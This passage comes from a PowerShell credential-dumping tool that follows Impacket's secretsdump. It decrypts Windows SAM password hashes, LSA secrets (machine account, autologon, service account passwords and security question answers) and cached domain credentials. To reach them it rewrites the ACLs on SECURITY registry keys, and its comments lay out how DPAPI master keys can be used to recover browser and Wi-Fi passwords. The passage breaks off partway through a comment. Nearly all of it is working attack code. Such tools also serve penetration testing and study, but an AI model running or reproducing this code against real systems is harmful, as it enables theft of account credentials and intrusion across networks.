				# NT Hash have been setted
				# Structure from Impacket "secretsdump.py" : SAM_HASH_AES
				$NTHashOffset = [BitConverter]::ToUInt32($UserKey["NTHashOffset"], 0)
				$NTHashLength = [BitConverter]::ToUInt32($UserKey["NTHashLength"], 0)
				$SAM_HASH_AES_NT = $UserKey["Data"][$NTHashOffset..$(($NTHashOffset + $NTHashLength)-1)]
				$PekID_NT = $SAM_HASH_AES_NT[0..1]
				$Revision_NT = $SAM_HASH_AES_NT[2..3]
				$DataOffset_NT = $SAM_HASH_AES_NT[4..7]
				$Salt_NT = $SAM_HASH_AES_NT[8..23]
				$Enc_NTHash = $SAM_HASH_AES_NT[24..$($SAM_HASH_AES_NT.Length - 1)]
			}
		}

		[byte[]]$LMHash = $emptyLM
		[byte[]]$NTHash= $emptyNT
		$DESKeys = RIDToDESKeys($RID)
		If ($Enc_LMHash)
		{
			If (-not $NewStyle)
			{
				$RC4Key_LM = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ALMPASSWORD);
				$Obf_LMHash = (NewRC4 $RC4Key_LM).Transform($Enc_LMHash)
			}
			Else
			{
				$Obf_LMHash = (AESTransform $HBootKey[0..0x0f] $Enc_LMHash $Salt_LM ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
			}

			$LMHash = (DESTransform $DESKeys[0] $Obf_LMHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_LMHash[8..$($Obf_LMHash.Length - 1)] $DESKeys[1] $False)
		}
		If ($Enc_NTHash)
		{
			If (-not $NewStyle)
			{
				$RC4Key_NT = [Security.Cryptography.MD5]::Create().ComputeHash($HBootKey[0..0x0f] + [BitConverter]::GetBytes($RID) + $ANTPASSWORD)
				$Obf_NTHash = (NewRC4 $RC4Key_NT).Transform($Enc_NTHash)
			}
			Else
			{
				$Obf_NTHash = (AESTransform $HBootKey[0..0x0f] $Enc_NTHash $Salt_NT ([Security.Cryptography.CipherMode]::CBC) $False)[0..0x0f]
			}

			$NTHash = (DESTransform $DESKeys[0] $Obf_NTHash[0..7] $DESKeys[0] $False) + (DESTransform $DESKeys[1] $Obf_NTHash[8..$($Obf_NTHash.Length - 1)] $DESKeys[1] $False)
		}

		return ($LMHash, $NTHash)
	}
	Else
	{
		return ($Null, $Null)
	}
}

function Get-SAM($BootKey)
{
	<#
		Get-SAM: BootKey -> Hashed BootKey -> We can decrypt LM/NT hashes
		All stuff is in Get-UserHashesDeobfuscated
	#>

	# Compute Hashed BootKey
	$HBootKey = Get-HBootkey $BootKey

	Write-Host "`n[===] Retrieve user's LM/NT Hashes and decrypt them with Boot Key [===]"

	# Get users keys
	$UsersKeys = Get-UsersKeys

	# For each user keys extract LM/NT Hashes deobfuscated/unencrypted
	$SAM = @{}
	ForEach ($UserKey in $UsersKeys)
	{
		$UserInfo = @{}

		$UserName = [Text.Encoding]::Unicode.GetString($UserKey["Data"], [BitConverter]::ToUInt32($UserKey["NameOffset"], 0), [BitConverter]::ToUInt32($UserKey["NameLength"], 0))
		$RID = [Convert]::ToUInt32($UserKey["PSChildName"], 16)
		$UserHashes = Get-UserHashesDeobfuscated $UserKey $HBootKey $RID
		$LMHash = $UserHashes[0]
		$NTHash = $UserHashes[1]
		If ($LMHash -and $NTHash)
		{
			$HexLMHash = [System.BitConverter]::ToString($LMHash).Replace("-", "")
			$HexNTHash = [System.BitConverter]::ToString($NTHash).Replace("-", "")
			Write-Host ("[+] {0}:{1}:{2}:{3}" -f ($UserName, $RID, $HexLMHash, $HexNTHash))

			$UserInfo["RID"] = $RID
			$UserInfo["NT"] = $NTHash
			$UserInfo["LM"] = $LMHash
			$SAM[$UserName] = $UserInfo
		}
	}

	return $SAM
}

<###############>
<# LSA Secrets #>
<###############>

<#
	Get-LSASecrets: Each secret is encrypted with LSA Secret Key, LSA Secret Key is encrypted with BootKey, after decrypting LSA Secrets we may gained:
		- $MACHINE.ACC = Machine account password in clear text if computer is joined to a domain
		- DefaultPassword = Clear text password when autologon is configured for an account
		- NL$KM = Secret key in clear text for decrypting Cached Domain Credentials
		- DPAPI_SYSTEM = System User PreKey and System Machine PreKey in clear text for decrypting System User MasterKey files and System Machine MasterKey files (DPAPI)
		- _SC_<ServiceName> = Service account password in clear text
		- ASPNET_WP_PASSWORD = Password for .NET services in clear text
		- L$_SQSA_S-<SID> = Clear text answers for Windows Security Questions
		- Others
		1- Get-LSASecretKey
		2- Get LSA secrets from HKLM\Security\Policy\Secrets and decrypt them with LSA Secret Key
#>

function Get-LSASecretKey($BootKey)
{
	<#
		Get-LSASecretKey: Get required LSA Secret Key for decrypting LSA Secrets with BootKey
			1- Get encrypted LSA Secret Key depending on Windows version:
				1.1- If >= Windows Vista (Check if HKLM\Security\Policy\PolEKList or HKLM\Security\Policy\PolSecretEncryptionKey exist)
					- Encrypted LSA Secret Key = Default property of registry HKLM\Security\Policy\PolEKList
					- Structure LSA_SECRET = Enc_LSASecretKey
					- Update = BootKey
					- For i in range (1000) : Update += LSA_SECRET[EncryptedData][:32]
					- Key = SHA256 (Update)
					- Data = LSA_SECRET[EncryptedData][32:]
					- For i in range (0, len(Data), 16):
						- Block = Data[i:i+16]
						- If (len(Block) < 16) : Block += "\x00" * (16 - len(Block))
						- Plaintext += AESDecrypt (Key, Block, "\x00" * 16)
					- Structure LSA_SECRET_BLOB = PlainText
					- LSASecretKey = LSA_SECRET_BLOB["Secret"][52:][:32]
				1.2- Else
					- Encrypted LSA Secret Key = Default property of registry of registry HKLM\Security\Policy\PolSecretEncryptionKey
					- Update = BootKey
					- for i in range (1000) : Update += Enc_LSASecretKey[60:76]
					- Key = MD5 (Update)
					- PlainText = RC4Decrypt (Key, Enc_LSASecretKey[12:60])
					- LSASecretKey = PlainText[0x10:0x20]

	#>

	Write-Host "`n[===] Retrieve LSA Secret Key with Boot Key [===]"

	# Set full control for registry "HKLM\SECURITY\Policy" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	[byte[]]$Enc_LSASecretKey = $Null
	$Global:VistaStyle = $True

	$Enc_LSASecretKey = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\PolEKList" ""
	If (-not $Enc_LSASecretKey)
	{
		$Enc_LSASecretKey =  Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\PolSecretEncryptionKey" ""
		If (-not $Enc_LSASecretKey)
		{
			# Remove ACL
			$Removed = $ACL.RemoveAccessRule($Rule)
			$SubKey.SetAccessControl($ACL)
			$SubKey.Close()

			Write-Error "Unable to retrieve encrypted LSA Secret Key"
			return $Null
		}
		Else
		{
			$Global:VistaStyle = $False
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	If ($Global:VistaStyle)
	{
		# Structure from Impacket "secretsdump.py" : LSA_SECRET
		$LSA_SECRET = $Enc_LSASecretKey
		$Version = $LSA_SECRET[0..3]
		$EncKeyID = $LSA_SECRET[4..19]
		$EncAlgorithm = $LSA_SECRET[20..23]
		$Flags = $LSA_SECRET[24..27]
		$EncryptedData = $LSA_SECRET[28..$($LSA_SECRET.Length-1)]

		$SHA256 = [System.Security.Cryptography.SHA256]::Create()
		$Update = $BootKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $EncryptedData[0..31]
		}
		$Key = $SHA256.ComputeHash($Update)
		$PlainText = [byte[]]@()
		$Data = $EncryptedData[32..$($EncryptedData.Length-1)]
		For ($i = 0; $i -lt $Data.Length; $i = $i+16)
		{
			$Block = $Data[$i..$($i+15)]
			If ($Block.Length -ne 16)
			{
				$Block = ($Block + ((,0) * (16-$Block.Length)))
			}
			$PlainText += (AESTransform $Key $Block (New-Object byte[] 16) ([Security.Cryptography.CipherMode]::CBC) $False)
		}

		# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
		$LSA_SECRET_BLOB = $PlainText
		$Length = [BitConverter]::ToUInt32($LSA_SECRET_BLOB[0..3], 0)
		$Unknown = $LSA_SECRET_BLOB[4..15]
		$Secret = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
		$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]

		$LSASecretKey = ($Secret[52..$($Secret.Length-1)])[0..31]
	}
	Else
	{
		$MD5 = [System.Security.Cryptography.MD5]::Create()
		$Update = $BootKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $Enc_LSASecretKey[60..75]
		}
		$Key = $MD5.ComputeHash($Update)
		$Plaintext = (NewRC4 $Key).Transform($Enc_LSASecretKey[12..59])
		$LSASecretKey = $PlainText[16..31]
	}

	$HexLSASecretKey = [System.BitConverter]::ToString($LSASecretKey).Replace("-", "")
	Write-Host ("[+] LSA Secret Key = {0}" -f ($HexLSASecretKey))

	return $LSASecretKey
}

function Decrypt-LSASecret($LSASecretKey, $Data, $SecretName)
{
	<#
		Decrypt-LSASecret: Decrypt an encrypted LSA Secret with LSA Secret Key
			1- Depending on Windows version:
				1.1- If >= Windows Vista
					- Structure LSA_SECRET = Data
					- Update = LSASecretKey
					- For i in range (1000) : Update += LSA_SECRET[EncryptedData][:32]
					- Key = SHA256 (Update)
					- Data = LSA_SECRET[EncryptedData][32:]
					- For i in range (0, len(Data), 16)
						- Block = Data[i:i+16]
						- If (len(Block) < 16) : Block += "\x00" * (16 - len(Block))
						- Plaintext += AESDecrypt (Key, Block, "\x00" * 16)
					- Structure LSA_SECRET_BLOB = PlainText
					- LSA Secret Key = LSA_SECRET_BLOB["Secret"]
				1.2- Else
					- Structure LSA_SECRET = Data
					- EncryptedSecretSize = Data[:4]
					- Value = Data[len(Data)-EncryptedSecretSize:]
					- Key0 = LSASecretKey
					- For i in range (0, len(Value), 8):
						- CipherText = Value[:8]
						- StrKey = Key0[:7]
						- Key = STRToKey(StrKey)
						- PlainText += DESDecrypt(Key, CipherText)
						- Key0 = Key0[7:]
						- Value = Value[8:]
						- If len(Key0) < 7
							- Key0 = LSASecretKey[len(Key0):]
					- Structure LSA_SECRET_XP = PlainText
					- LSA Secret Key = LSA_SECRET_XP["Secret"]
	#>

	If ($Global:VistaStyle)
	{
		# Structure from Impacket "secretsdump.py" : LSA_SECRET
		$LSA_SECRET = $Data
		$Version = $LSA_SECRET[0..3]
		$EncKeyID = $LSA_SECRET[4..19]
		$EncAlgorithm = $LSA_SECRET[20..23]
		$Flags = $LSA_SECRET[24..27]
		$EncryptedData = $LSA_SECRET[28..$($LSA_SECRET.Length-1)]

		$SHA256 = [System.Security.Cryptography.SHA256]::Create()
		$Update = $LSASecretKey
		For ($i = 0; $i -lt 1000; $i += 1)
		{
			$Update += $EncryptedData[0..31]
		}
		$Key = $SHA256.ComputeHash($Update)
		$PlainText = [byte[]]@()
		$Data = $EncryptedData[32..$($EncryptedData.Length-1)]
		For ($i = 0; $i -lt $Data.Length; $i = $i+16)
		{
			$Block = $Data[$i..$($i+15)]
			If ($Block.Length -ne 16)
			{
				$Block = ($Block + ((,0) * (16-$Block.Length)))
			}
			$PlainText += (AESTransform $Key $Block (New-Object byte[] 16) ([Security.Cryptography.CipherMode]::CBC) $False)
		}

		If ($SecretName -ne 'NL$KM')
		{
			# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
			$LSA_SECRET_BLOB = $PlainText
			$Length = [BitConverter]::ToUInt32($LSA_SECRET_BLOB[0..3], 0)
			If ($Length -gt 0)
			{
				$Unknown = $LSA_SECRET_BLOB[4..15]
				$Secret = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
				$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]

				return $Secret
			}
			Else
			{
				return $Null
			}
		}
		Else
		{
			return $PlainText
		}
	}
	Else
	{
		# Not tested
		$EncryptedSecretSize = [BitConverter]::ToUInt32($Data[0..3], 0)
		$Value = $Data[$($Data.Length-$EncryptedSecretSize)..$($Data.Length-1)]
		$Key0 = $LSASecretKey
		$PlainText = [byte[]]@()
		For ($i = 0; $i -lt $Value.Length; $i = $i+8)
		{
			$CipherText = $Value[0..7]
			$StrKey = $Key0[0..6]
			$Key = STRToKey $StrKey
			$PlainText += (DESTransform $Key $CipherText $Key $False)
			$Key0 = $Key0[7..$($Key0.Length-1)]
			$Value = $Value[8..$($Value.Length-1)]
			If (Key0.Length -lt 7)
			{
				$Key0 = $LSASecretKey[$($Key0.Length)..$($LSASecretKey.Length-1)]
			}
		}

		# Structure from Impacket "secretsdump.py" : LSA_SECRET_XP
		$LSA_SECRET_XP = $PlainText
		$Length = [BitConverter]::ToUInt32($LSA_SECRET_XP[0..3], 0)
		If ($Length -gt 0)
		{
			$Version = $LSA_SECRET_XP[4..7]
			$Secret = $LSA_SECRET_XP[8..$(8+($Length-1))]

			return $Secret
		}
		Else
		{
			return $Null
		}
	}
}

function Get-LSASecrets($LSASecretKey)
{
	<#
		Get-LSASecrets: Get LSA Secrets and decrypt them with LSA Secret Key
			1- Parse default property of registry SECURITY\Policy\Secrets\<LSASecretType>\CurrVal (Don't use OldVal)
			2- Decrypt each secret with LSA Secret Key
		All stuff is in Decrypt-LSASecret
	#>

	Write-Host "`n[===] Enumerate LSA Secrets and decrypt them with LSA Secret Key [===]"

	# Set full control for registry "HKLM\SECURITY\Policy\Secrets" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Policy\Secrets', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	$LSASecrets = @{}

	ForEach ($Child in $(Get-ChildItem HKLM:\SECURITY\Policy\Secrets))
	{
		$LSASecret = @{}

		$Enc_CurrVal = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\Secrets\$($Child.PSChildName)\CurrVal" ""
		$Enc_OldVal = Get-RegKeyPropertyValue "HKLM" "SECURITY\Policy\Secrets\$($Child.PSChildName)\OldVal" ""
		If ($Enc_CurrVal)
		{
			$LSASecret["CurrVal"] = Decrypt-LSASecret $LSASecretKey $Enc_CurrVal $Child.PSChildName
		}
		If ($Enc_OldVal)
		{
			$LSASecret["OldVal"] = Decrypt-LSASecret $LSASecretKey $Enc_OldVal $Child.PSChildName
		}

		$LSASecrets[$Child.PSChildName] = $LSASecret

		If ((-not $LSASecret["CurrVal"]) -or ($LSASecret["CurrVal"][0..1] -eq @(0, 0)))
		{
			Continue
		}
		ElseIf ($Child.PSChildName -eq 'NL$KM')
		{
			# Structure from Impacket "secretsdump.py" : LSA_SECRET_BLOB
			$LSA_SECRET_BLOB = $LSASecret["CurrVal"]
			$Length = [BitConverter]::ToUInt32($LSA_SECRET_BLOB[0..3], 0)
			$Unknown = $LSA_SECRET_BLOB[4..15]
			$NLKMKey = $LSA_SECRET_BLOB[16..$(16+($Length-1))]
			$Remaining = $LSA_SECRET_BLOB[$(16+($Length))..$($LSA_SECRET_BLOB.Length-1)]
			$HexNLKM = [System.BitConverter]::ToString($NLKMKey).Replace("-", "")
			Write-Host ('[+] Cached Domain Credentials NL$KM Key = ' + $HexNLKM)
		}
		ElseIf ($Child.PSChildName -eq "DPAPI_SYSTEM")
		{
			# Structure from Impacket "dpapi.py" : DPAPI_SYSTEM
			$DPAPI_SYSTEM = $LSASecret["CurrVal"]
			$Version = $DPAPI_SYSTEM[0..3]
			$MachineKey = $DPAPI_SYSTEM[4..23]
			$UserKey = $DPAPI_SYSTEM[24..43]

			$HexMachinekey = [System.BitConverter]::ToString($MachineKey).Replace("-", "")
			$HexUserkey = [System.BitConverter]::ToString($UserKey).Replace("-", "")
			Write-Host ("[+] DPAPI System Machine PreKey = {0}`n[+] DPAPI System User PreKey = {1}" -f ($HexMachinekey, $HexUserkey))
		}
		ElseIf ($Child.PSChildName -eq '$MACHINE.ACC')
		{
			$MACHINEACC_Plain = $LSASecret["CurrVal"]
			$MACHINEACC_NT = MD4Transform $MACHINEACC_Plain
			$emptyLM = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
			$HexEmptyLM = [System.BitConverter]::ToString($emptyLM).Replace("-", "")
			$HexMACHINEACC_NT = [System.BitConverter]::ToString($MACHINEACC_NT).Replace("-", "")
			$HexMACHINEACC_Plain = [System.BitConverter]::ToString($MACHINEACC_Plain).Replace("-", "")
			$ComputerName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name).Name
			$DomainName = (Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain).Domain
			Write-Host ('[+] Machine account LM/NT Hashes = {0}\{1}$:{2}:{3}' -f ($DomainName, $ComputerName, $HexEmptyLM, $HexMACHINEACC_NT))
			Write-Host ('[+] Machine account Cleartext Pwd Hex = {0}' -f ($HexMACHINEACC_Plain))
		}
		ElseIf ($Child.PSChildName -eq "DefaultPassword")
		{
			$DefaultPWD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			$DefaultLogin = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").GetValue("DefaultUserName")
			$DefaultDomain = (Get-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").GetValue("DefaultDomainName")
			If (-not $DefaultLogin) { $DefaultLogin = "<UnknownUser>" }
			If (-not $DefaultDomain) { $DefaultDomain = "." }
			Write-Host ("[+] Default login account credentials = {0}\{1}:{2}" -f ($DefaultDomain, $DefaultLogin, $DefaultPWD))
		}
		ElseIf ($Child.PSChildName[0..3] -eq "_SC_")
		{
			# Not tested
			$Secret = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			$ServiceName = $Child.PSChildName[4..$($Child.PSChildName.Length-1)]
			$Services = Get-WmiObject Win32_Service -Property Name, StartName
			ForEach ($Service in $Services)
			{
				If ($Service.Name -eq $ServiceName)
				{
					$Account = $Service.StartName
				}
			}
			If (-not $Account) { $Account = "<UnknownUser>" }
			Write-Host ("[+] Service account secret = {0}:{1}:{2}" -f ($Account, $ServiceName, $Secret))
		}
		ElseIf ($Child.PSChildName -eq "ASPNET_WP_PASSWORD")
		{
			# Not tested
			$ASPNET_WP_PASSWORD = [Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])
			Write-Host ("[+] ASPNET Password = {0}" -f ($ASPNET_WP_PASSWORD))
		}
		ElseIf ($Child.PSChildName[0..8] -eq 'L$_SQSA_S')
		{
			# Not tested
			$SID = $Child.PSChildName[9..$($Child.PSChildName.length-1)]
			$JSON = (([Text.Encoding]::Unicode.GetString($LSASecret["CurrVal"])).Replace([char]0xa0, " ")) | ConvertFrom-Json
			If ([int]$JSON.version -eq 1)
			{
				ForEach ($Item in $JSON.questions)
				{
				   $Question = $Item.question
				   $Answer = $Item.answer
				   Write-Host ("[+] Security Question/Answer = {0}:{1}" -f ($Question, $Answer))
				}
			}
			Else
			{
				Write-Host ("[-] Unknown Security Questions LSA Secret version")
			}
		}
		Else
		{
			Write-Host ("[-] Unknown LSA Secret : {0}" -f ($Child.PSChildName))
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	return $LSASecrets
}

<#############################>
<# Cached Domain Credentials #>
<#############################>

function Get-CachedDomainCreds($NLKM)
{
	<#
	Get-CachedDomainCreds: With decrypted NL$KM key from LSA Storage we can decrypt Cached Domain Credentials
		1- If property "NL$IterationCount" of registry HKLM\SECURITY\Cache -> Compute iterations
		2- For each cached domain credential into property "NL$<X>" of registry HKLM\SECURITY\Cache
			- Structure NL_RECORD = HKLM\SECURITY\Cache\NL$<X>
			2.1- If NL_RECORD[IV] != 16 * "\x00"
				2.1.1- If >= Windows Vista
					- PlainText = AESDecrypt (NL$KM[16:32], NL_RECORD[EncryptedData], NL_RECORD[IV])
				2.1.2- Else
					- Key = HMAC_MD5 (Key=NL$KM, Message=NL_RECORD[IV])
					- PlainText = RC4Encrypt (Key, NL_RECORD[EncryptedData])
			2.2- Else
				- Unknown case
			2.3- Parse decrypted cached domain credential
				- MSCashHash = PlainText[:0x10]
				- PlainText = PlainText[0x48:]
				- UserName = PlainText[:NL_RECORD[UserLength]].decode ("UTF-16LE")
				- PlainText = PlainText[pad(NL_RECORD[UserLength]) + pad(NL_RECORD[DomainNameLength]):]
				- DomainName = Plaintext[:pad(NL_RECORD[DnsDomainNameLength])].decode ("UTF-16LE")
	#>

	Write-Host ("`n[===] Enumerate Cached Domain Credentials and decrypt them with {0} Key from LSA Secrets [===]" -f ('NL$KM'))

	# Set full control for registry "HKLM\SECURITY\Cache" and subregistry/subkeys
	$SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SECURITY\Cache', 'ReadWriteSubTree', 'ChangePermissions')
	$ACL = $SubKey.GetAccessControl()
	$Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
	$ACL.SetAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)

	$IterationCount = 10240
	If (Get-ItemProperty "HKLM:\SECURITY\Cache" -Name 'NL$IterationCount' -ErrorAction SilentlyContinue)
	{
		$Record = [BitConverter]::ToUInt32((Get-RegKeyPropertyValue "HKLM" "SECURITY\Cache" 'NL$IterationCount'), 0)
		If ($Record -gt 10240) { $IterationCount = $Record -band 0xfffffc00 }
		Else { $IterationCount = $Record * 1024 }
	}

	$CachedDomainCreds = @{}

	(Get-ItemProperty "HKLM:\SECURITY\Cache").PSObject.Properties | ForEach-Object -Process {
		If (($_.Name -match '^NL\$') -and ($_.Name -ne 'NL$Control') -and ($_.Name -ne 'NL$IterationCount'))
		{
			$Enc_CachedCred = Get-RegKeyPropertyValue "HKLM" "SECURITY\Cache" $_.Name

			If ($Enc_CachedCred -and (@(Compare-Object $Enc_CachedCred (New-Object byte[] ($Enc_CachedCred.Length)) -SyncWindow 0).Length -ne 0))
			{
				# Structure from Impacket "secretsdump.py" : NL_RECORD
				$NL_RECORD = $Enc_CachedCred
				$UserLength = [BitConverter]::ToUInt16($NL_RECORD[0..1], 0)
				$DomainNameLength = [BitConverter]::ToUInt16($NL_RECORD[2..3], 0)
				$EffectiveNameLength = $NL_RECORD[4..5]
				$FullNameLength = $NL_RECORD[6..7]
				$LogonScriptName = $NL_RECORD[8..9]
				$ProfilePathLength = $NL_RECORD[10..11]
				$HomeDirectoryLength = $NL_RECORD[12..13]
				$HomeDirectoryDriveLength = $NL_RECORD[14..15]
				$UserId = $NL_RECORD[16..19]
				$PrimaryGroupId = $NL_RECORD[20..23]
				$GroupCount = $NL_RECORD[24..27]
				$LogonDomainNameLength = $NL_RECORD[28..29]
				$Unkown0 = $NL_RECORD[30..31]
				$LastWrite = $NL_RECORD[32..39]
				$Revision = $NL_RECORD[40..43]
				$SidCount = $NL_RECORD[44..47]
				$Flags = $NL_RECORD[48..51]
				$Unkown1 = $NL_RECORD[52..55]
				$LogonPackageLength = $NL_RECORD[56..59]
				$DnsDomainNameLength = [BitConverter]::ToUInt16($NL_RECORD[60..61], 0)
				$UPN = $NL_RECORD[62..63]
				<#
				$MetaData = $NL_RECORD[..]
				$FullDomainLength = $NL_RECORD[..]
				$Length2 = $NL_RECORD[..]
				#>
				$IV = $NL_RECORD[64..79]
				$CH = $NL_RECORD[80..95]
				$EncryptedData = $NL_RECORD[96..$($NL_RECORD.Length-1)]

				If (@(Compare-Object $IV (New-Object byte[] 16) -SyncWindow 0).Length -ne 0)
				{
					If (([BitConverter]::ToUInt32($Flags, 0) -band 1) -eq 1)
					{
						If ($Global:VistaStyle)
						{
							$PlainText = AESTransform $NLKM[16..31] $EncryptedData $IV ([Security.Cryptography.CipherMode]::CBC) $False
						}
						Else
						{
							$HMAC = [System.Security.Cryptography.HMACMD5]::Create()
							$HMAC.Key = $NLKM
							$HMAC.HashName = "MD5"
							$Key = $HMAC.ComputeHash($IV)
							$PlainText = (NewRC4 $Key).Transform($EncryptedData)
						}

						$CachedDomainCred = @{}

						$MSCashHash = $PlainText[0..15]
						$HexMSCashHash = [System.BitConverter]::ToString($MSCashHash).Replace("-", "")
						$Plaintext = $Plaintext[72..$($PlainText.Length-1)]
						$UserName = [Text.Encoding]::Unicode.GetString($PlainText[0..$($UserLength-1)])
						$Plaintext = $PlainText[$((Pad $UserLength) + (Pad $DomainNameLength))..$($PlainText.Length-1)]
						$DomainName = ([Text.Encoding]::Unicode.GetString($PlainText[0..$((Pad $DnsDomainNameLength)-1)])) -Replace "`0", ""

						Write-Host ("[+] {0}\{1}:{2}" -f ($DomainName, $UserName, $HexMSCashHash))

						$CachedDomainCred["DomainName"] = $DomainName
						$CachedDomainCred["MSCashHash"] = $MSCashHash
						$CachedDomainCreds[$UserName] = $CachedDomainCred
					}
					Else
					{
						Write-Error ("Unknown NL_RECORD[Flags] for entry {0}" -f ($_.Name))
					}
				}
			}
		}
	}

	# Remove ACL
	$Removed = $ACL.RemoveAccessRule($Rule)
	$SubKey.SetAccessControl($ACL)
	$SubKey.Close()

	If ($CachedDomainCreds.Count -eq 0) { Write-Host "[-] No cached domain credentials saved" }

	return $CachedDomainCreds
}

<#################>
<# DPAPI Secrets #>
<#################>

<#
	- DPAPI Secrets (or DPAPI Blob) are encrypted/decrypted with MasterKeys and CryptProtectData()/CryptUnprotectData() from Windows API
	- MasterKeys are encrypted with PreKeys
	- MasterKeys are stored encrypted into MasterKey Files
		- Users MasterKey' Files
			- C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<UserSID>\<MKGUID>
		- System MasterKey' Files
			- C:\Windows\System32\Microsoft\Protect\User\<MKGUID> (System User Master Key File)
			- C:\Windows\System32\Microsoft\Protect\<MKGUID> (System Machine Master Key File)
		- Each DPAPI Blob store <MKGUID> to know which Master Key file use for DPAPI decryption
	- Two types of PreKeys
		- Users' PreKeys
		- System PreKeys (System User PreKey and System Machine PreKey) from DPAPI_SYSTEM of LSA Storage (encrypted with LSA Secret Key)
	- Users' PreKeys can be computed from their (password + SID) or (NT hash + SID)
		- Key1 = HMAC-SHA1 (SHA1 (Pwd), SID + "\x00") (For local users)
		- Key2 = HMAC-SHA1 (SHA1 (NTHash), SID + "\x00") (For domain users)
		- Key3 = HMAC-SHA1 (PKBKDF2-HMAC-SHA256 (PKBKDF2-HMAC-SHA256 (NTHash, SID), SID), SID + "\x00") (For users of "Protected users" group)
	- Each MasterKey File contain 5 entries
		- Headers and system information
		- MasterKey encrypted with Users' PreKeys or System PreKeys (depending on DPAPI encryption/decryption context)
		- DomainBackupMasterKey encrypted with RSA public key of DC (RSA keys pair generated and send to DC when generating Master Key)
		- LocalBackupEncryptionKey encrypted with System Machine PreKey from DPAPI_SYSTEM of LSA Storage
		- CREDHIST GUID
			- In Windows 2000, It stored the LocalBackupMasterKey encrypted, which could be decrypted by any administrator with the LocalBackupEncryptionKey and allowed to retrieve every Users' MasterKeys
			- After Windows 2000, It point to a CREDHIST File which contain Old User's PreKeys chain encrypted with user current's password
	- For each MasterKey File : Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000) point to the same Master Key value once decrypted
	- DPAPI encryption/decryption context
		- "CRYPTPROTECT_UI_FORBIDDEN" = 0x1 = Used when user interface is not available. For example, when using remote access.
		- "CRYPTPROTECT_LOCAL_MACHINE" = 0x4 = Data is protected using local computer account. Any administrator user of the system may be able to decrypt it.
		- "CRYPTPROTECT_CRED_SYNC" = 0x8 = Forces synchronizing user's credentals. Normally runs automatically upon user password change.
		- "CRYPTPROTECT_AUDIT" = 0x10 = Enables audit during encryption/dectyption
		- "CRYPTPROTECT_VERIFY_PROTECTION" = 0x40 = The flag checks security level of DPAPI blob. If the default security level is higher than current security level of the blob, the function returns error CRYPT_I_NEW_PROTECTION_REQUIRED as advice to reset securiry for the source data.
		- "CRYPTPROTECT_CRED_REGENERATE" = 0x80 = Regenerate local computer passwords.
		- "CRYPTPROTECT_SYSTEM" = 0x20000000 = Indicates that only system processes can encrypt/decrypt data.

	- DPAPI Secrets can be:
		- Cookies/Pwds from IE, Chrome (Encrypted with User MasterKeys)
		- Wi-Fi passwords (Encrypted with System MasterKeys)
		- E-mail account passwords in Outlook, Windows Mail, etc.
		- Passwords from Remote Desktop Connection Manager
		- Internal FTP manager account passwords
		- Encryption key in Windows CardSpace and Windows Credential Vault Manager
		- Any data encrypted with CryptProtectData()

	Get-DPAPISecrets:
		1- Compute PreKeys (Users' PreKeys with gathered Pwds/NTHashes and System PreKeys with DPAPI_SYSTEM from LSA Storage)
		2- Retrieve all MasterKey Files and try to decrypt each part (Master Key/Domain Backup Master Key/Local Backup Master Key (Windows 2000)) with PreKeys to obtain the decrypted MasterKey value
			- For System MasterKey' Files we know that we have to use System PreKeys (and we always have them)
			- For Users MasterKey' we don't know which User PreKeys to use (and we may have not them), BUT we can validate the decryption success
		3- Find DPAPI Secrets
			- Chrome cookies/pwds have known locations
